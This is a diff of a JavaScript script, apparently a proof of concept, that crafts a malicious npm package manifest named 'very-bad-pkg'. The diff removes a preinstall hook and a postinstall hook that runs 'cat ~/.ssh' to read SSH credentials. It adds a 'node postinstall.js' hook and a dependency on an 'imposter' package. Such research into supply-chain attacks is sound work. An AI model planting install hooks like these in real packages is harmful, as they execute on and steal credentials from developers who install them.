@@ -12,7 +12,7 @@ const pack = require('libnpmpack');
 
     // craft manifest
     const name = 'very-bad-pkg';
-    const version = '1.0.3';
+    const version = '1.2.0';
     const manifest = {
       _id: name,
       name: name,
@@ -30,11 +30,11 @@ const pack = require('libnpmpack');
             tarball: '',
           },
           scripts: {
-            "preinstall": "touch ./mal-write && echo \"bad payload written!\"\n",
-            "postinstall": "cat ~/.ssh"
+            "postinstall": "node postinstall.js"
           },
           dependencies: {
-            "core-js": "^3.31.1"
+            "imposter-pkg-poc": "1.0.3",
+            "jq": "1.7.2"
           },
           author: "l33t h4x0r",
         },
